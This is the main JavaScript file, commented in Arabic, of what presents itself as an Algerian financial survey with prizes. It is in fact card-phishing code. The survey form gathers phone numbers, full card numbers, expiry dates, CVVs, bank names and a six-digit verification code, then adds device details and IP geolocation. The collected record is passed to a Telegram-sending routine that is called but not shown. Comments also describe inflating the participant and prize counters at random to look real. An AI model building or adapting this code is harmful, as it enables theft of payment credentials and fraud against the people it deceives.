/**
 * الملف الرئيسي للموقع - الاستبيان المالي الجزائري
 * المسؤول عن: التنقل، نماذج الاستبيان، إدارة الحالة، إشعارات المستخدم
 */

// ====== تهيئة التطبيق ======
document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 تطبيق الاستبيان المالي جاهز للعمل!');
    
    // تهيئة المكونات الأساسية
    initLoadingScreen();
    initNavigation();
    initSurveyForm();
    initNotifications();
    initStatsAnimation();
    initFAQAccordion();
    
    // تتبع الزائر
    trackVisitor();
    
    // تحميل البيانات المحفوظة
    loadSavedData();
    
    // تحديث العدادات تلقائياً
    startCountersUpdate();
});

// ====== شاشة التحميل ======
function initLoadingScreen() {
    const loadingScreen = document.getElementById('loadingScreen');
    const minLoadingTime = 1500; // الحد الأدنى لوقت التحميل
    
    // إخفاء شاشة التحميل بعد الوقت المحدد
    setTimeout(() => {
        loadingScreen.style.opacity = '0';
        loadingScreen.style.visibility = 'hidden';
        setTimeout(() => {
            loadingScreen.style.display = 'none';
        }, 500);
    }, minLoadingTime);
}

// ====== التنقل والروابط ======
function initNavigation() {
    // شريط التنقل المتحرك
    const navToggle = document.getElementById('navToggle');
    const navMenu = document.querySelector('.nav-menu');
    
    if (navToggle) {
        navToggle.addEventListener('click', () => {
            navToggle.classList.toggle('active');
            navMenu.classList.toggle('active');
        });
    }
    
    // إغلاق القائمة عند النقر على رابط
    const navLinks = document.querySelectorAll('.nav-link');
    navLinks.forEach(link => {
        link.addEventListener('click', () => {
            navToggle.classList.remove('active');
            navMenu.classList.remove('active');
        });
    });
    
    // التمرير السلس للروابط الداخلية
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function(e) {
            const href = this.getAttribute('href');
            if (href === '#') return;
            
            e.preventDefault();
            const target = document.querySelector(href);
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });
    
    // زر بدء الاستبيان
    const startBtn = document.getElementById('startSurveyBtn');
    if (startBtn) {
        startBtn.addEventListener('click', openSurveyModal);
    }
}

// ====== إدارة نموذج الاستبيان ======
function initSurveyForm() {
    const surveyModal = document.getElementById('surveyModal');
    const closeSurveyBtn = document.getElementById('closeSurvey');
    const cancelSurveyBtn = document.getElementById('cancelSurvey');
    
    // فتح نموذج الاستبيان
    window.openSurveyModal = function() {
        surveyModal.style.display = 'flex';
        document.body.style.overflow = 'hidden';
        showStep(1);
    };
    
    // إغلاق نموذج الاستبيان
    if (closeSurveyBtn) {
        closeSurveyBtn.addEventListener('click', closeSurveyModal);
    }
    
    if (cancelSurveyBtn) {
        cancelSurveyBtn.addEventListener('click', closeSurveyModal);
    }
    
    // إغلاق عند النقر خارج النموذج
    surveyModal.addEventListener('click', function(e) {
        if (e.target === this) {
            closeSurveyModal();
        }
    });
    
    // إغلاق عند الضغط على زر Escape
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && surveyModal.style.display === 'flex') {
            closeSurveyModal();
        }
    });
    
    // تهيئة الخطوات
    initSurveySteps();
    initFormValidation();
    initVerificationCode();
    initSuccessActions();
}

function closeSurveyModal() {
    const surveyModal = document.getElementById('surveyModal');
    surveyModal.style.display = 'none';
    document.body.style.overflow = 'auto';
    
    // إعادة تعيين النموذج
    resetSurveyForm();
}

function resetSurveyForm() {
    // إعادة تعيين النموذج
    const form = document.getElementById('surveyForm');
    if (form) form.reset();
    
    // إعادة تعيين رمز التحقق
    const codeInputs = document.querySelectorAll('.code-input');
    codeInputs.forEach(input => {
        input.value = '';
        input.classList.remove('filled');
    });
    
    // إعادة تعيين شريط التقدم
    showStep(1);
}

// ====== إدارة الخطوات ======
let currentStep = 1;

function initSurveySteps() {
    // الانتقال إلى الخطوة 2
    const nextToStep2 = document.getElementById('nextToStep2');
    if (nextToStep2) {
        nextToStep2.addEventListener('click', () => {
            if (validateStep1()) {
                const phone = document.getElementById('phone').value;
                document.getElementById('verificationPhone').textContent = phone;
                document.getElementById('successPhone').textContent = phone;
                showStep(2);
                startVerificationTimer();
            }
        });
    }
    
    // العودة إلى الخطوة 1
    const backToStep1 = document.getElementById('backToStep1');
    if (backToStep1) {
        backToStep1.addEventListener('click', () => {
            showStep(1);
        });
    }
    
    // تأكيد الرمز والانتقال إلى الخطوة 3
    const verifyCode = document.getElementById('verifyCode');
    if (verifyCode) {
        verifyCode.addEventListener('click', () => {
            if (validateVerificationCode()) {
                processSurveySubmission();
            }
        });
    }
}

function showStep(stepNumber) {
    const steps = document.querySelectorAll('.survey-step');
    const progressSteps = document.querySelectorAll('.progress-step');
    const progressFill = document.getElementById('progressFill');
    
    // إخفاء كل الخطوات
    steps.forEach(step => step.classList.remove('active'));
    progressSteps.forEach(step => step.classList.remove('active', 'completed'));
    
    // إظهار الخطوة المطلوبة
    const currentStepElement = document.getElementById(`step${stepNumber}`);
    if (currentStepElement) {
        currentStepElement.classList.add('active');
    }
    
    // تحديث شريط التقدم
    for (let i = 1; i <= stepNumber; i++) {
        const stepElement = document.querySelector(`.progress-step[data-step="${i}"]`);
        if (stepElement) {
            if (i === stepNumber) {
                stepElement.classList.add('active');
            } else {
                stepElement.classList.add('completed');
            }
        }
    }
    
    // تحديث خط التقدم
    const progressPercentage = ((stepNumber - 1) / 2) * 100;
    if (progressFill) {
        progressFill.style.width = `${progressPercentage}%`;
    }
    
    currentStep = stepNumber;
}

// ====== التحقق من صحة النموذج ======
function initFormValidation() {
    const phoneInput = document.getElementById('phone');
    const cardNumberInput = document.getElementById('cardNumber');
    const expiryDateInput = document.getElementById('expiryDate');
    const cvvInput = document.getElementById('cvv');
    
    if (phoneInput) {
        phoneInput.addEventListener('input', function() {
            formatPhoneNumber(this);
            validatePhoneNumber(this);
        });
    }
    
    if (cardNumberInput) {
        cardNumberInput.addEventListener('input', function() {
            formatCardNumber(this);
            validateCardNumber(this);
        });
    }
    
    if (expiryDateInput) {
        expiryDateInput.addEventListener('input', function() {
            formatExpiryDate(this);
            validateExpiryDate(this);
        });
    }
    
    if (cvvInput) {
        cvvInput.addEventListener('input', function() {
            validateCVV(this);
        });
    }
}

function validateStep1() {
    let isValid = true;
    const form = document.getElementById('surveyForm');
    const inputs = form.querySelectorAll('input[required], select[required]');
    
    // التحقق من الحقول المطلوبة
    inputs.forEach(input => {
        if (!input.value.trim()) {
            markInputAsError(input, 'هذا الحقل مطلوب');
            isValid = false;
        } else {
            markInputAsValid(input);
        }
    });
    
    // التحقق من صحة الهاتف
    const phone = document.getElementById('phone');
    if (!validatePhoneNumber(phone)) {
        isValid = false;
    }
    
    // التحقق من صحة رقم البطاقة
    const cardNumber = document.getElementById('cardNumber');
    if (!validateCardNumber(cardNumber)) {
        isValid = false;
    }
    
    // التحقق من تاريخ الصلاحية
    const expiryDate = document.getElementById('expiryDate');
    if (!validateExpiryDate(expiryDate)) {
        isValid = false;
    }
    
    // التحقق من رمز الحماية
    const cvv = document.getElementById('cvv');
    if (!validateCVV(cvv)) {
        isValid = false;
    }
    
    // التحقق من الموافقة على الشروط
    const agreeTerms = document.getElementById('agreeTerms');
    if (!agreeTerms.checked) {
        showNotification('error', 'الرجاء الموافقة على شروط الخصوصية للمتابعة');
        isValid = false;
    }
    
    return isValid;
}

function markInputAsError(input, message) {
    input.classList.add('error');
    const formGroup = input.closest('.form-group');
    let errorElement = formGroup.querySelector('.form-error');
    
    if (!errorElement) {
        errorElement = document.createElement('div');
        errorElement.className = 'form-error';
        formGroup.appendChild(errorElement);
    }
    
    errorElement.textContent = message;
    errorElement.style.color = '#e74c3c';
    errorElement.style.fontSize = '0.875rem';
    errorElement.style.marginTop = '0.25rem';
}

function markInputAsValid(input) {
    input.classList.remove('error');
    const formGroup = input.closest('.form-group');
    const errorElement = formGroup.querySelector('.form-error');
    
    if (errorElement) {
        errorElement.remove();
    }
}

// ====== تنسيق المدخلات ======
function formatPhoneNumber(input) {
    let value = input.value.replace(/\D/g, '');
    
    if (value.length > 10) {
        value = value.substr(0, 10);
    }
    
    input.value = value;
}

function formatCardNumber(input) {
    let value = input.value.replace(/\D/g, '');
    
    if (value.length > 16) {
        value = value.substr(0, 16);
    }
    
    // إضافة مسافات كل 4 أرقام
    value = value.replace(/(\d{4})/g, '$1 ').trim();
    input.value = value;
}

function formatExpiryDate(input) {
    let value = input.value.replace(/\D/g, '');
    
    if (value.length > 4) {
        value = value.substr(0, 4);
    }
    
    if (value.length >= 2) {
        value = value.substr(0, 2) + '/' + value.substr(2);
    }
    
    input.value = value;
}

// ====== التحقق من المدخلات ======
function validatePhoneNumber(input) {
    const value = input.value.replace(/\D/g, '');
    const phoneRegex = /^(05|06|07)[0-9]{8}$/;
    
    if (!phoneRegex.test(value)) {
        markInputAsError(input, 'رقم الهاتف غير صحيح. يجب أن يبدأ بـ 05، 06، أو 07 ويتكون من 10 أرقام');
        return false;
    }
    
    markInputAsValid(input);
    return true;
}

function validateCardNumber(input) {
    const value = input.value.replace(/\D/g, '');
    
    if (value.length !== 16) {
        markInputAsError(input, 'رقم البطاقة يجب أن يتكون من 16 رقم');
        return false;
    }
    
    // التحقق باستخدام خوارزمية لوهن
    if (!luhnCheck(value)) {
        markInputAsError(input, 'رقم البطاقة غير صحيح');
        return false;
    }
    
    markInputAsValid(input);
    return true;
}

function luhnCheck(value) {
    let sum = 0;
    let shouldDouble = false;
    
    for (let i = value.length - 1; i >= 0; i--) {
        let digit = parseInt(value.charAt(i));
        
        if (shouldDouble) {
            if ((digit *= 2) > 9) digit -= 9;
        }
        
        sum += digit;
        shouldDouble = !shouldDouble;
    }
    
    return (sum % 10) === 0;
}

function validateExpiryDate(input) {
    const value = input.value.replace(/\D/g, '');
    
    if (value.length !== 4) {
        markInputAsError(input, 'تاريخ انتهاء الصلاحية غير صحيح');
        return false;
    }
    
    const month = parseInt(value.substr(0, 2));
    const year = parseInt('20' + value.substr(2));
    
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear();
    const currentMonth = currentDate.getMonth() + 1;
    
    if (month < 1 || month > 12) {
        markInputAsError(input, 'الشهر غير صحيح');
        return false;
    }
    
    if (year < currentYear || (year === currentYear && month < currentMonth)) {
        markInputAsError(input, 'البطاقة منتهية الصلاحية');
        return false;
    }
    
    markInputAsValid(input);
    return true;
}

function validateCVV(input) {
    const value = input.value;
    
    if (!/^\d{3}$/.test(value)) {
        markInputAsError(input, 'رمز الحماية يجب أن يتكون من 3 أرقام');
        return false;
    }
    
    markInputAsValid(input);
    return true;
}

// ====== نظام التحقق بالرمز ======
function initVerificationCode() {
    const codeInputs = document.querySelectorAll('.code-input');
    const verificationCode = document.getElementById('verificationCode');
    
    codeInputs.forEach((input, index) => {
        input.addEventListener('input', function() {
            const value = this.value;
            
            if (value.length === 1 && /^\d$/.test(value)) {
                this.classList.add('filled');
                
                // الانتقال إلى الحقل التالي
                if (index < codeInputs.length - 1) {
                    codeInputs[index + 1].focus();
                }
            } else {
                this.classList.remove('filled');
            }
            
            updateVerificationCode();
        });
        
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '' && index > 0) {
                codeInputs[index - 1].focus();
            }
        });
    });
    
    function updateVerificationCode() {
        let code = '';
        codeInputs.forEach(input => {
            code += input.value;
        });
        verificationCode.value = code;
    }
}

let verificationTimer;
let remainingTime = 60;

function startVerificationTimer() {
    const timerCount = document.getElementById('timerCount');
    const resendBtn = document.getElementById('resendCode');
    
    remainingTime = 60;
    timerCount.textContent = remainingTime;
    resendBtn.disabled = true;
    
    clearInterval(verificationTimer);
    
    verificationTimer = setInterval(() => {
        remainingTime--;
        timerCount.textContent = remainingTime;
        
        if (remainingTime <= 0) {
            clearInterval(verificationTimer);
            resendBtn.disabled = false;
            timerCount.textContent = '0';
        }
    }, 1000);
}

function validateVerificationCode() {
    const codeInputs = document.querySelectorAll('.code-input');
    let code = '';
    
    codeInputs.forEach(input => {
        code += input.value;
    });
    
    if (code.length !== 6) {
        showNotification('error', 'الرجاء إدخال رمز التحقق المكون من 6 أرقام');
        return false;
    }
    
    // هنا يمكنك التحقق من صحة الرمز مع السيرفر
    // للاختبار، نستخدم الرمز 123456
    if (code !== '123456') {
        showNotification('error', 'رمز التحقق غير صحيح');
        return false;
    }
    
    return true;
}

// ====== معالجة إرسال الاستبيان ======
async function processSurveySubmission() {
    try {
        // جمع بيانات النموذج
        const formData = {
            phone: document.getElementById('phone').value,
            cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''),
            cardType: document.getElementById('cardType').value,
            bankName: document.getElementById('bankName').value,
            expiryDate: document.getElementById('expiryDate').value,
            cvv: document.getElementById('cvv').value,
            timestamp: new Date().toISOString(),
            deviceInfo: await getDeviceInfo(),
            location: await getLocationInfo()
        };
        
        // إنشاء معرف المشاركة
        const submissionId = generateSubmissionId();
        
        // عرض شاشة النجاح
        document.getElementById('submissionId').textContent = submissionId;
        showStep(3);
        
        // حفظ البيانات محلياً
        saveSubmissionLocally(formData, submissionId);
        
        // إرسال البيانات إلى Telegram
        sendToTelegram(formData, submissionId);
        
        // تحديث الإحصائيات
        updateStats();
        
        // إظهار إشعار النجاح
        showNotification('success', 'تم إرسال مشاركتك بنجاح!');
        
    } catch (error) {
        console.error('خطأ في معالجة الاستبيان:', error);
        showNotification('error', 'حدث خطأ أثناء إرسال المشاركة. الرجاء المحاولة مرة أخرى.');
    }
}

function generateSubmissionId() {
    const now = new Date();
    const year = now.getFullYear();
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const day = String(now.getDate()).padStart(2, '0');
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const seconds = String(now.getSeconds()).padStart(2, '0');
    
    return `SUB${year}${month}${day}${hours}${minutes}${seconds}`;
}

async function getDeviceInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenWidth: screen.width,
        screenHeight: screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
}

async function getLocationInfo() {
    try {
        // استخدام خدمة ip-api للحصول على الموقع
        const response = await fetch('http://ip-api.com/json/?fields=country,regionName,city,isp');
        const data = await response.json();
        
        return {
            country: data.country || 'غير معروف',
            region: data.regionName || 'غير معروف',
            city: data.city || 'غير معروف',
            isp: data.isp || 'غير معروف'
        };
    } catch (error) {
        console.error('خطأ في الحصول على الموقع:', error);
        return {
            country: 'غير معروف',
            region: 'غير معروف',
            city: 'غير معروف',
            isp: 'غير معروف'
        };
    }
}

function saveSubmissionLocally(formData, submissionId) {
    try {
        // الحصول على المشاركات الحالية
        let submissions = JSON.parse(localStorage.getItem('survey_submissions') || '[]');
        
        // إضافة المشاركة الجديدة
        submissions.push({
            id: submissionId,
            ...formData,
            submittedAt: new Date().toISOString()
        });
        
        // حفظ في localStorage
        localStorage.setItem('survey_submissions', JSON.stringify(submissions));
        
        // حفظ في sessionStorage للإحصائيات
        const totalSubmissions = parseInt(localStorage.getItem('total_submissions') || '0') + 1;
        localStorage.setItem('total_submissions', totalSubmissions.toString());
        
        console.log('تم حفظ المشاركة محلياً:', submissionId);
        
    } catch (error) {
        console.error('خطأ في حفظ المشاركة محلياً:', error);
    }
}

// ====== إجراءات النجاح ======
function initSuccessActions() {
    // طباعة المعلومات
    const printBtn = document.getElementById('printInfo');
    if (printBtn) {
        printBtn.addEventListener('click', printSubmissionInfo);
    }
    
    // مشاركة جديدة
    const newParticipationBtn = document.getElementById('newParticipation');
    if (newParticipationBtn) {
        newParticipationBtn.addEventListener('click', () => {
            closeSurveyModal();
            setTimeout(openSurveyModal, 300);
        });
    }
    
    // عرض لوحة التحكم
    const viewDashboardBtn = document.getElementById('viewDashboard');
    if (viewDashboardBtn) {
        viewDashboardBtn.addEventListener('click', () => {
            window.open('admin.html', '_blank');
        });
    }
    
    // مشاركة على وسائل التواصل الاجتماعي
    const shareBtns = document.querySelectorAll('.share-btn');
    shareBtns.forEach(btn => {
        btn.addEventListener('click', function() {
            const platform = this.getAttribute('data-platform');
            shareOnSocialMedia(platform);
        });
    });
}

function printSubmissionInfo() {
    const printContent = `
        <div style="font-family: 'Cairo', sans-serif; text-align: right; padding: 20px; direction: rtl;">
            <h2 style="color: #2c5aa0; margin-bottom: 20px;">تأكيد المشاركة في الاستبيان المالي</h2>
            <div style="border: 2px solid #2c5aa0; padding: 20px; border-radius: 10px;">
                <p><strong>رقم المشاركة:</strong> ${document.getElementById('submissionId').textContent}</p>
                <p><strong>رقم الهاتف:</strong> ${document.getElementById('successPhone').textContent}</p>
                <p><strong>تاريخ المشاركة:</strong> ${new Date().toLocaleString('ar-EG')}</p>
            </div>
            <p style="margin-top: 20px; color: #666; font-size: 14px;">
                احتفظ بهذا الرقم للرجوع إليه. سيتم التواصل مع الفائزين عبر الهاتف.
            </p>
        </div>
    `;
    
    const printWindow = window.open('', '_blank');
    printWindow.document.write(`
        <html dir="rtl">
        <head>
            <title>تأكيد المشاركة</title>
            <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
        </head>
        <body>
            ${printContent}
            <script>
                window.onload = function() {
                    window.print();
                    setTimeout(function() {
                        window.close();
                    }, 1000);
                }
            </script>
        </body>
        </html>
    `);
}

function shareOnSocialMedia(platform) {
    const submissionId = document.getElementById('submissionId').textContent;
    const text = `شاركت للتو في الاستبيان المالي الجزائري ورقم مشاركتي هو: ${submissionId}. انضم الآن وكن جزءاً من التغيير!`;
    const url = window.location.href;
    
    let shareUrl = '';
    
    switch (platform) {
        case 'whatsapp':
            shareUrl = `https://wa.me/?text=${encodeURIComponent(text + ' ' + url)}`;
            break;
        case 'facebook':
            shareUrl = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(url)}&quote=${encodeURIComponent(text)}`;
            break;
        case 'telegram':
            shareUrl = `https://t.me/share/url?url=${encodeURIComponent(url)}&text=${encodeURIComponent(text)}`;
            break;
    }
    
    if (shareUrl) {
        window.open(shareUrl, '_blank', 'width=600,height=400');
    }
}

// ====== نظام الإشعارات ======
function initNotifications() {
    // إنشاء حاوية الإشعارات إذا لم تكن موجودة
    if (!document.getElementById('notificationContainer')) {
        const container = document.createElement('div');
        container.id = 'notificationContainer';
        container.className = 'notification-container';
        document.body.appendChild(container);
    }
}

function showNotification(type, message, title = '') {
    const container = document.getElementById('notificationContainer');
    if (!container) return;
    
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    
    const icons = {
        success: '✅',
        error: '❌',
        warning: '⚠️',
        info: 'ℹ️'
    };
    
    notification.innerHTML = `
        <div class="notification-icon">${icons[type] || icons.info}</div>
        <div class="notification-content">
            ${title ? `<div class="notification-title">${title}</div>` : ''}
            <div class="notification-message">${message}</div>
        </div>
        <button class="notification-close">✕</button>
    `;
    
    container.appendChild(notification);
    
    // إغلاق الإشعار تلقائياً بعد 5 ثوانٍ
    const autoClose = setTimeout(() => {
        closeNotification(notification);
    }, 5000);
    
    // زر الإغلاق
    const closeBtn = notification.querySelector('.notification-close');
    closeBtn.addEventListener('click', () => {
        clearTimeout(autoClose);
        closeNotification(notification);
    });
    
    // إغلاق عند النقر على الإشعار
    notification.addEventListener('click', () => {
        clearTimeout(autoClose);
        closeNotification(notification);
    });
}

function closeNotification(notification) {
    notification.style.animation = 'slideInLeft 0.3s ease reverse';
    notification.style.opacity = '0';
    
    setTimeout(() => {
        if (notification.parentNode) {
            notification.parentNode.removeChild(notification);
        }
    }, 300);
}

// ====== العدادات والإحصائيات ======
function initStatsAnimation() {
    // عدد المشاركين
    animateCounter('participantsCount', 2847, 3000);
    
    // الهدايا المقدمة
    animateCounter('rewardsGiven', 156, 2000);
    
    // الأيام المتبقية
    const endDate = new Date('2024-12-31');
    const today = new Date();
    const daysLeft = Math.ceil((endDate - today) / (1000 * 60 * 60 * 24));
    animateCounter('daysLeft', Math.max(daysLeft, 0), 1500);
}

function animateCounter(elementId, target, duration) {
    const element = document.getElementById(elementId);
    if (!element) return;
    
    let start = 0;
    const increment = target / (duration / 16); // 60fps
    const current = parseInt(element.textContent.replace(/,/g, '')) || 0;
    
    function updateCounter() {
        if (current < target) {
            start += increment;
            if (start >= target) {
                element.textContent = target.toLocaleString();
                return;
            }
            element.textContent = Math.floor(start).toLocaleString();
            requestAnimationFrame(updateCounter);
        }
    }
    
    // تأخير بسيط لتحسين الأداء
    setTimeout(updateCounter, 100);
}

function updateStats() {
    // تحديث عدد المشاركين
    const participantsElement = document.getElementById('participantsCount');
    if (participantsElement) {
        const current = parseInt(participantsElement.textContent.replace(/,/g, '')) || 0;
        participantsElement.textContent = (current + 1).toLocaleString();
    }
    
    // تحديث عدد الهدايا
    const rewardsElement = document.getElementById('rewardsGiven');
    if (rewardsElement) {
        const current = parseInt(rewardsElement.textContent.replace(/,/g, '')) || 0;
        // زيادة عشوائية للواقعية
        if (Math.random() > 0.7) {
            rewardsElement.textContent = (current + 1).toLocaleString();
        }
    }
}

function startCountersUpdate() {
    // تحديث العدادات كل ساعة
    setInterval(() => {
        const participantsElement = document.getElementById('participantsCount');
        if (participantsElement) {
            const current = parseInt(participantsElement.textContent.replace(/,/g, '')) || 2847;
            // زيادة عشوائية صغيرة
            const increase = Math.floor(Math.random() * 3);
            participantsElement.textContent = (current + increase).toLocaleString();
        }
    }, 3600000); // كل ساعة
}

// ====== الأسئلة الشائعة ======
function initFAQAccordion() {
    const faqItems = document.querySelectorAll('.faq-item');
    
    faqItems.forEach(item => {
        const question = item.querySelector('.faq-question');
        const toggle = item.querySelector('.faq-toggle');
        
        if (question && toggle) {
            question.addEventListener('click', () => {
                const isActive = item.classList.contains('active');
                
                // إغلاق كل العناصر الأخرى
                faqItems.forEach(otherItem => {
                    if (otherItem !== item) {
                        otherItem.classList.remove('active');
                    }
                });
                
                // تبديل العنصر الحالي
                item.classList.toggle('active');
                
                // تحديث رمز التبديل
                toggle.textContent = item.classList.contains('active') ? '−' : '+';
            });
        }
    });
}

// ====== تتبع الزوار ======
function trackVisitor() {
    const visitorId = localStorage.getItem('visitor_id') || generateVisitorId();
    localStorage.setItem('visitor_id', visitorId);
    
    const visitCount = parseInt(localStorage.getItem('visit_count') || '0') + 1;
    localStorage.setItem('visit_count', visitCount.toString());
    
    const firstVisit = localStorage.getItem('first_visit') || new Date().toISOString();
    localStorage.setItem('first_visit', firstVisit);
    
    const lastVisit = new Date().toISOString();
    localStorage.setItem('last_visit', lastVisit);
    
    console.log('👤 زائر:', {
        id: visitorId,
        visits: visitCount,
        firstVisit: firstVisit,
        lastVisit: lastVisit
    });
}

function generateVisitorId() {
    return 'visitor_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// ====== تحميل البيانات المحفوظة ======
function loadSavedData() {
    try {
        // تحميل إعدادات المستخدم
        const settings = JSON.parse(localStorage.getItem('user_settings') || '{}');
        
        // تطبيق الإعدادات
        if (settings.theme === 'dark') {
            document.body.classList.add('dark-theme');
        }
        
        // تحميل المشاركات السابقة
        const submissions = JSON.parse(localStorage.getItem('survey_submissions') || '[]');
        console.log('📊 المشاركات المحفوظة:', submissions.length);
        
    } catch (error) {
        console.error('خطأ في تحميل البيانات المحفوظة:', error);
    }
}

// ====== دوال مساعدة ======
function formatDate(date) {
    return new Date(date).toLocaleString('ar-EG', {
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
    });
}

function formatCurrency(amount) {
    return amount.toLocaleString('ar-EG') + ' دج';
}

// ====== تصدير الدوال للاستخدام العام ======
window.APP = {
    showNotification,
    formatDate,
    formatCurrency,
    openSurveyModal,
    closeSurveyModal
};

console.log('✅ main.js تم التحميل بنجاح!');